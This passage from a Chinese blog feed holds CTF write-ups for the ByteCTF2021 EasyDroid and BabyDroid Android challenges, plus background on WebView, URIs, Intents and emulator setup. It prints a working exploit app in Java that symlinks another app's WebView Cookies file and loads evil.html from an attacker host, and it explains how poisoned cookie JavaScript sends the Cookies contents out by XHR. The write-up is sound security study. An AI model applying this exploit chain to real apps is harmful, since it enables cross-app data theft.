文档”是什么？</strong></p><p><strong>是 Cookies 文件本身（通过 symlink.html 加载）</strong></p><p>为什么Cookie 里的代码会被执行?</p><p>TestActivity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(&quot;file:///.../symlink.html&quot;);</span><br><span class="line">symlink.html → /data/data/com.bytectf.easydroid/app_webview/Cookies</span><br></pre></td></tr></table></figure><p>WebView 把 <strong>Cookies SQLite 文件</strong>当成文本流</p><p>SQLite 文件里包含你写入的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img ... onerror=...&gt;</span><br></pre></td></tr></table></figure><p>WebView HTML 解析器扫描到这段</p><p>img加载失败 → onerror执行</p><p><strong>JS 执行成功，Cookies 文件被外传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function() &#123;</span><br><span class="line">    location.href = &quot;intent:...&quot;</span><br><span class="line">&#125;, 40000);</span><br></pre></td></tr></table></figure><p>为什么一定要延迟？</p><p>因为：</p><ul><li>document.cookie &#x3D; …</li><li><strong>不等于立刻写入 SQLite</strong></li><li>Chromium Cookie 写盘：<ul><li>有缓存</li><li>有异步</li></ul></li><li>如果马上跳 TestActivity：symlink.html 可能指向的是<strong>还没写入 payload 的 Cookies</strong></li></ul><p>intent 这一段在干嘛？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intent:pwneasydroid#Intent;</span><br><span class="line">package=com.bytectf.easydroid;</span><br><span class="line">component=com.bytectf.easydroid/.TestActivity;</span><br><span class="line">S.url=file:///data/data/com.bytectf.pwneasydroid/files/symlink.html;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><p>利用 MainActivity 中 <code>shouldOverrideUrlLoading</code></p></li><li><p>让 EasyDroid <strong>自己启动 TestActivity</strong></p></li><li><p>并传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = file:///.../symlink.html</span><br></pre></td></tr></table></figure></li></ul><p>TestActivity 的 WebView 就会加载 Cookies（通过 symlink）。</p><blockquote><p>evil.html 首先通过 <code>document.cookie</code> 将包含恶意 HTML&#x2F;JavaScript 的 payload 写入 Chromium Cookies 数据库；待数据写盘后，通过延时触发 intent 跳转，启动 TestActivity 并加载指向 Cookies 文件的符号链接页面。WebView 在解析 Cookies 文件时执行被污染的 payload，通过 XHR 将 Cookies 内容（包含 flag）回传至攻击者服务器。</p></blockquote><p>Step B：evil.html 再触发 intent 启动 TestActivity，并让它加载一个 file:&#x2F;&#x2F; URL</p><p>这里选择让 TestActivity 加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///data/data/com.bytectf.pwneasydroid/files/symlink.html</span><br></pre></td></tr></table></figure><p>而攻击 App 这段时间里创建了：</p><ul><li><p>&#x2F;data&#x2F;data&#x2F;com.bytectf.pwneasydroid&#x2F;files&#x2F;symlink.html <strong>是一个 symlink</strong></p></li><li><p>它指向：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.bytectf.easydroid/app_webview/Cookies</span><br></pre></td></tr></table></figure></li></ul><p>Step 3：TestActivity 的 WebView loadUrl(file:&#x2F;&#x2F;&#x2F;…&#x2F;symlink.html)</p><p>结果就是：</p><blockquote><p>WebView 实际读到的是 <strong>EasyDroid 的 Cookies SQLite 文件</strong> 内容。</p></blockquote><p>然后关键点来了：<strong>SQLite 文件里包含之前塞进去的恶意 JS 字符串</strong>（以 cookie value 的形式存在）。</p><p>在某些 WebView&#x2F;解析路径里，这段字符串可能被当成 HTML&#x2F;JS 的一部分执行&#x2F;触发，从而发起 XHR 把 Cookies 内容外传。</p><blockquote><p>这就是污染 Cookies → 再加载 Cookies 本身触发执行 → 外传的套路。</p></blockquote><p>MainActivity:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwneasydroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            attack();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jumpToApp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://toutiao.com@xxx.xxx.xxx.xxx/evil.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, IOException &#123;</span><br><span class="line">        jumpToApp();</span><br><span class="line">        <span class="type">String</span> <span class="variable">root</span> <span class="operator">=</span> getApplicationInfo().dataDir;</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 &quot;</span> + root);</span><br><span class="line">        Log.d(<span class="string">&quot;path&quot;</span>, root);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sympath</span> <span class="operator">=</span> root + <span class="string">&quot;/files&quot;</span> + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">        cmdexec(<span class="string">&quot;rm -rf &quot;</span>+ root + <span class="string">&quot;/files&quot;</span>);</span><br><span class="line">        cmdexec(<span class="string">&quot;mkdir &quot;</span>+ root + <span class="string">&quot;/files&quot;</span>);</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/com.bytectf.pwneasydroid/files&quot;</span>);</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.easydroid/app_webview/Cookies&quot;</span> + <span class="string">&quot; &quot;</span> + sympath);</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 &quot;</span> + root + <span class="string">&quot;/files&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">cmdexec</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(s).waitFor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重建 files&#x2F; 目录，确保干净</p><p>Android11实测无法成功</p><blockquote><p>在 Android 11 环境中，SELinux 处于强制 Enforcing 状态，通过 <code>setenforce</code> 动态切换仍无法成功，导致应用无法跨越私有数据目录访问其他应用的 <code>file://</code> 资源。即使符号链接与文件权限正确配置，WebView 在 Enforcing 模式下仍会返回 <code>ERR_FILE_NOT_FOUND</code>。因此该攻击方案仅在 SELinux 放宽或旧版本 Android 环境中可行，此外Android高版本的Cookies文件在&#x2F;app&#x2F;webview&#x2F;Default&#x2F;Cookies目录下</p></blockquote><blockquote><p> WebView 在解析 <code>file://</code> 时，会做 realpath &#x2F; canonical path 校验，一旦发现路径“起点在 A App 私有目录，但真实目标在 B App 私有目录，<br> 就直接拒绝加载。这是 <strong>Chromium WebView 在 Android 10+ 引入的安全加固</strong></p></blockquote><p>Android 8.1:</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121230618633.png" alt="image-20260121230618633"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121230640877.png" alt="image-20260121230640877"></p><h2 id="一些补充知识"><a href="#一些补充知识" class="headerlink" title="一些补充知识"></a>一些补充知识</h2><h3 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h3><p>来自[<a href="https://bbs.kanxue.com/thread-275379-1.htm#msg_header_h2_0">原创]ByteCTF2022 mobile系列-Android安全-看雪安全社区｜专业技术交流与安全研究论坛</a></p><blockquote><p><strong>WebView 是 Android 提供的一个组件，用来在 App 内部显示和运行网页内容，本质上是一个嵌入在 App 里的浏览器。</strong></p><p>它让开发者可以：</p><ul><li>不跳转外部浏览器</li><li>在 App 内直接加载：<ul><li>HTML</li><li>CSS</li><li>JavaScript</li><li>网络页面 &#x2F; 本地页面</li></ul></li></ul><p>WebView 底层是 <strong>Chromium</strong></p><table><thead><tr><th>对比点</th><th>浏览器</th><th>WebView</th></tr></thead><tbody><tr><td>运行环境</td><td>系统级</td><td>App 私有</td></tr><tr><td>权限</td><td>浏览器自身</td><td><strong>继承 App 权限</strong></td></tr><tr><td>Cookie</td><td>浏览器</td><td><strong>App 私有目录</strong></td></tr><tr><td>Intent</td><td>受限</td><td><strong>可被 App 接管</strong></td></tr><tr><td>exported 校验</td><td>有</td><td><strong>可能被绕过</strong></td></tr></tbody></table></blockquote><p>很多App中都会内置html5界面，有时候会涉及到与android进行交互，这就需要用到WebView控件，WebView可以做到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.显示和渲染web界面</span><br><span class="line">2.直接使用html进行布局</span><br><span class="line">3.与js进行交互</span><br></pre></td></tr></table></figure><p>创建WebView拥有两种方法，</p><p>第一种方法是WebView webview &#x3D; new WebView(getApplicationContext());创建；</p><p>第二种是在xml文件内放在布局中；下面以第二种方法为例</p><p>如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// WebView</span></span><br><span class="line">    <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.eeeewebview);</span><br><span class="line">    webView.loadUrl(<span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">            <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">            view.loadUrl(url);</span><br><span class="line">            <span class="comment">//返回true</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><blockquote><p><strong>这个 Activity 创建了一个 WebView，用它加载百度首页，并且通过 <code>shouldOverrideUrlLoading</code> 确保所有页面跳转都仍然在当前 WebView 内部完成，而不是跳到系统浏览器。</strong></p></blockquote><p>设置 WebViewClient</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(new WebViewClient()&#123;</span><br></pre></td></tr></table></figure><p>默认情况下：</p><ul><li>WebView 遇到跳转（如点击链接）</li><li><strong>可能会调用系统浏览器</strong></li></ul><p>设置 WebViewClient&#96;的目的：</p><ul><li><strong>拦截 WebView 的行为</strong></li><li>告诉系统：我自己处理跳转</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">    view.loadUrl(url);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>无论 WebView 想跳转到哪个 URL，都不要交给系统处理，我自己在当前 WebView 里加载。</p></blockquote><h3 id="URI补充"><a href="#URI补充" class="headerlink" title="URI补充"></a>URI补充</h3><p>之前文章介绍过还是有遗漏的知识,之前主要是操控file</p><p>Uri代表要操作的数据，Android上可用的每种资源 (图像、视频片段、网页等) 都可以用Uri来表示。从概念上来讲，UrI包括URL。</p><p>Uri的基本结构是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">大致为[scheme:]scheme-specific-part[#fragment]</span><br><span class="line">细分为[scheme:][//authority][path][?query][#fragment]</span><br></pre></td></tr></table></figure><p>path可以存在多个，以”&#x2F;“连接 scheme:&#x2F;&#x2F;authority&#x2F;path1&#x2F;path2&#x2F;path3?query#fragment</p><p>query可以带参数的返回值也可不带 scheme:&#x2F;&#x2F;authority&#x2F;path1&#x2F;path2&#x2F;path3?id &#x3D; 1#fragment</p><p>举例如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://http://www.eeeeeeeeeeeeeeeea.cn/about?id=1</span><br></pre></td></tr></table></figure><p>scheme是在”:”之前，所以他匹配的是http</p><p>authority是在”&#x2F;&#x2F;“之后，所以<a href="http://www.eeeeeeeeeeeeeeeea.cn与其对应/">http://www.eeeeeeeeeeeeeeeea.cn与其对应</a></p><p>path自然对应的就是about这个页面,query对应的是id&#x3D;1</p><p>在安卓内，除了authority和scheme必须存在，其他的可以选择性的要或者不要</p><p>将一个url解析成uri对象的操作是Uri.parse(“<a href="http://www.baidu.com”),就是将百度网址解析成一个uri对象,可以对其进行其他的各种操作了/">http://www.baidu.com”)，就是将百度网址解析成一个uri对象，可以对其进行其他的各种操作了</a></p><table><thead><tr><th>部分</th><th>值</th></tr></thead><tbody><tr><td>scheme</td><td>http</td></tr><tr><td>host &#x2F; authority</td><td><a href="http://www.baidu.com/">www.baidu.com</a></td></tr><tr><td>path</td><td>&#x2F;</td></tr></tbody></table><p>上篇文章中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent_back.setData(Uri.parse(&quot;content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag&quot;));</span><br></pre></td></tr></table></figure><p>其实也是一个道理</p><h3 id="Intent补充"><a href="#Intent补充" class="headerlink" title="Intent补充"></a>Intent补充</h3><p>显式intent和隐式intent</p><p>intent包括两种，一是显式另一个是隐式。显式intent通常是已经知道要启动Activity的包名，多发于同一个app内；隐式intent只知道要执行的动作是什么，比如拍照，录像，打开一个网站。</p><p>那么隐式的intent如何启动一个组件呢呢？如果没有约束的话可能会造成一些后果，所以在Manifest文件内定义了intent-filter标签，如果组件中的intentfilter和intent中的intentfilter匹配，系统就会启动该组件，并把intent传给它；若有多个组件都符合，系统变会弹出一个窗口，任我们选择启动该intent的应用(app)。</p><p>在intent-filter标签中，我们可以选择三个intent的属性进行设置，包括action，category，data</p><p>怎么匹配?</p><p>系统主要从三方面**做匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Action  +  Data  +  Category</span><br></pre></td></tr></table></figure><p><strong>三者同时满足，才算匹配</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><p>规则：</p><p>Intent 只能有一个 action，intent-filter 可以声明多个 action</p><p>只要 Intent 的 action &#x3D;&#x3D; intent-filter 中的任意一个 action，即匹配</p><p>Intent 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br></pre></td></tr></table></figure><p>Manifest 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><p>规则：</p><blockquote><p><strong>Intent 中的所有 category，必须都在 intent-filter 中出现</strong></p></blockquote><ul><li><p>Intent 可以有多个 category</p></li><li><p>intent-filter 也可以有多个</p></li><li><p><strong>intent-filter 多出来的 category 不影响</strong></p></li><li><p>Intent 多出来的 category → 不匹配</p></li><li><p><strong>隐式 Intent 默认会自动加上 <code>CATEGORY_DEFAULT</code></strong></p></li><li><p>所以：intent-filter <strong>几乎必须声明 DEFAULT</strong>否则 <code>startActivity(intent)</code> 会直接失败</p></li></ul><p>Intent 中的 Data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setData(Uri.parse(&quot;http://www.baidu.com&quot;));</span><br></pre></td></tr></table></figure><p>intent-filter 中的 Data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;data</span><br><span class="line">    android:scheme=&quot;http&quot;</span><br><span class="line">    android:host=&quot;www.baidu.com&quot;</span><br><span class="line">    android:path=&quot;/&quot; /&gt;</span><br></pre></td></tr></table></figure><p>匹配规则：</p><p>① scheme 必须匹配</p><ul><li>Intent 有 scheme → filter 必须有相同 scheme</li><li>常见：<ul><li>http</li><li>https</li><li>content</li><li>file</li><li>intent</li></ul></li></ul><p>② host &#x2F; port &#x2F; path</p><ul><li>filter 中声明了 → 必须匹配</li><li>filter 没声明 → 不限制</li></ul><hr><p>③ MIME 类型（如果有）</p><ul><li><code>intent.setType(&quot;image/png&quot;)</code></li><li>filter 里也要能接住</li></ul><p>例子</p><p>Intent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent(Intent.ACTION_VIEW);</span><br><span class="line">intent.setData(Uri.parse(&quot;http://www.baidu.com&quot;));</span><br></pre></td></tr></table></figure><p>Manifest</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;</span><br><span class="line">    &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">    &lt;data android:scheme=&quot;http&quot; /&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>在 Android 12（API 31）之前：</strong></p><ul><li><strong>有 <code>intent-filter</code> → <code>exported</code> 默认为 <code>true</code></strong></li><li><strong>没有 <code>intent-filter</code> → <code>exported</code> 默认为 <code>false</code></strong></li></ul></blockquote><blockquote><p><strong>在 Android 12 及之后：</strong></p><ul><li><strong>只要组件声明了 <code>intent-filter</code>，就必须显式写 <code>android:exported=&quot;true|false&quot;</code></strong></li><li>否则 <strong>直接安装失败</strong></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-EasyDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-EasyDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 EasyDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021 EasyD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 BabyDroid复现</title>
    <link href="http://matriy330.github.io/27338605/"/>
    <id>http://matriy330.github.io/27338605/</id>
    <published>2026-01-17T05:38:37.000Z</published>
    <updated>2026-01-20T11:54:08.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-BabyDroid复现"><a href="#ByteCTF2021-BabyDroid复现" class="headerlink" title="ByteCTF2021 BabyDroid复现"></a>ByteCTF2021 BabyDroid复现</h1><p>直接参考<a href="https://blog.lleavesg.top/article/ByteCTF-2021-BabyDroid#f13f4051d167405c98dd996efc97e377">ByteCTF2021 BabyDroid复现 | LLeaves Blog</a></p><p>还真没做过这样的题，首先环境就搞了半天</p><h2 id="Docker环境配置-失败"><a href="#Docker环境配置-失败" class="headerlink" title="Docker环境配置(失败)"></a>Docker环境配置(失败)</h2><blockquote><p>PS：最后还是没跑起来</p></blockquote><p>附件地址：<a href="https://ctf.lanzoui.com/b02cjfxtg">ByteCTF</a></p><p>复现环境说明：<a href="https://my.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">ByteCTF2021 writeup for Android challenges - 飞书云文档</a></p><p>下载下来后可以看到Dockerfile等文件</p><p>你需要一台云服务器(因为在部署时，需要&#x2F;dev&#x2F;kvm)</p><blockquote><p><strong>容器里要跑 Android emulator，需要宿主机提供 KVM</strong>。<strong>虚拟机里还不能再开 KVM（嵌套虚拟化）</strong></p></blockquote><p>一般物理机比较稳</p><p>将内容传至服务器后，给run.sh权限</p><p>然后修改Dockerfile需要修改几个地方</p><p>①</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RUN set -e -x; \</span><br><span class="line">        yes | sdkmanager --install \</span><br><span class="line">                &quot;cmdline-tools;latest&quot; \</span><br><span class="line">                &quot;platform-tools&quot; \</span><br><span class="line">                &quot;build-tools;30.0.0&quot; \</span><br><span class="line">                &quot;platforms;android-30&quot; \</span><br><span class="line">                &quot;system-images;android-30;google_apis;x86_64&quot; \</span><br><span class="line">                &quot;emulator&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RUN set -e -x; \</span><br><span class="line">        yes | SKIP_JDK_VERSION_CHECK=1 sdkmanager --install \</span><br><span class="line">                &quot;cmdline-tools;latest&quot; \</span><br><span class="line">                &quot;platform-tools&quot; \</span><br><span class="line">                &quot;build-tools;30.0.0&quot; \</span><br><span class="line">                &quot;platforms;android-30&quot; \</span><br><span class="line">                &quot;system-images;android-30;google_apis;x86_64&quot; \</span><br><span class="line">                &quot;emulator&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>②</p><p>去掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN sdkmanager --update;</span><br></pre></td></tr></table></figure><blockquote><p><strong>老题目 + 新 SDK + 新 Docker &#x3D; 必须做一次兼容修补</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115213729715.png" alt="image-20260115213729715"></p><p>这里还有个提交的输入简单写个脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;c7b1dd&quot;</span></span><br><span class="line">target = <span class="string">&quot;000000&quot;</span></span><br><span class="line">chars = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(p)</span><br><span class="line">        h = hashlib.sha256((prefix + s).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> h.startswith(target):</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            <span class="keyword">raise</span> SystemExit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115214100069.png" alt="image-20260115214100069"></p><p>正确即可输入apk，URL</p><p>这个题目的逻辑不是传统意义的CTF解题</p><p>比赛方提供环境，环境内运行APK，我们需要用APK研究漏洞，编写出自己的APK去攻击利用，得到flag，因此复现时部署环境需要用kvm</p><p>坑点，里面还有端口的问题，也就是说即使你能跑起来这个docker也会遇上端口不对齐的问题，就算对齐了，也跑不起来</p><p>还要修复jdk版本不对，文件里的是jdk11，现在需要使用jdk17了，修复后仍然跑不起来力竭了</p><p>可以看看<a href="https://xz.aliyun.com/news/16393">Android Security学习之ByteCTF2021_mobile 环境搭建+前两道题Writeup-先知社区</a></p><p>但是多半也是跑不起来的</p><h2 id="模拟器环境搭建"><a href="#模拟器环境搭建" class="headerlink" 